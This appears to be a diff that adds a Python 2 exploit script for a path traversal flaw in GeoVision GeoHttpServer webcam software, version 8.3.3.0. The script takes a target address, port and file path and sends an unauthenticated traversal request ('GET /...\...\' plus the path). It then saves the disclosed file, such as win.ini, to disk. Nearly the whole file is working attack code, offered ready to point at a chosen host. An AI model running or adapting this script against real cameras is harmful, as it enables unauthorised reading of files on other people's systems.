@@ -1,0 +1,79 @@
+#!/usr/bin/python
+import os
+import sys
+import socket
+import binascii
+
+'''
+Title       : GeoVision GeoHttpServer WebCams Remote File Disclosure Exploit
+CVE-ID      : none
+Product     : GeoVision
+System		: GeoHttpServer
+Affected    : 8.3.3.0 (may be more)
+Impact      : Critical
+Remote      : Yes
+Website link: http://www.geovision.com.tw/
+Reported    : 10/06/2015
+Author      : Viktor Minin, minin.viktor@gmail.com
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+No authentication (login) is required to exploit this vulnerability. 
+The GeoVision GeoHttpServer application is prone to a remote file disclosure vulnerability.
+An attacker can exploit this vulnerability to retrieve and download stored files on server such as 'boot.ini' and 'win.ini' by using a simple url request which made by browser.
+'''
+
+#os.system("cls")
+os.system('title GeoVision GeoHttpServer Webcams Remote File Disclosure Exploit');
+os.system('color 2');
+
+socket.setdefaulttimeout = 0.50
+os.environ['no_proxy'] = '127.0.0.1,localhost'
+CRLF = "\r\n"
+
+
+def main(): 
+	print "#######################################################################"
+	print "# GeoVision GeoHttpServer Webcams Remote File Disclosure Exploit"
+	print "# Usage: <ip> <port> <file>" 
+	print "# Example: " +sys.argv[0]+ " 127.0.0.1 1337 windows\win.ini" 
+	print "#######################################################################"
+	exit()
+
+try:
+	url 	= sys.argv[1]
+	port 	= int(sys.argv[2])
+	#files 	= open(sys.argv[3],'r').read().split() 
+	file 	= sys.argv[3]
+except:
+	main()
+	
+def recvall(sock):
+	data = ""
+	part = None
+	while part != "":
+		part = sock.recv(4096)
+		data += part
+	return data
+
+def request(url, port, pfile):
+	PATH = str(pfile)	
+	HOST = url
+	PORT = port
+	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+	sock.connect((HOST, PORT))
+	sock.send("GET /...\...\\" + PATH + "%s HTTP/1.0\r\n\r\n" % (CRLF))
+	data = recvall(sock)
+	temp = data.split("\r\n\r\n")
+	sock.shutdown(1)	
+	sock.close()
+	return temp[1]
+
+ret = request(url, port, file)
+hex	= "".join("{:02x}".format(ord(c)) for c in ret)
+bin = binascii.unhexlify(hex)
+print ret
+file = open(file.replace('\\', '_'),"wb")
+file.write(bin)
+file.close()
+
+#~EOF
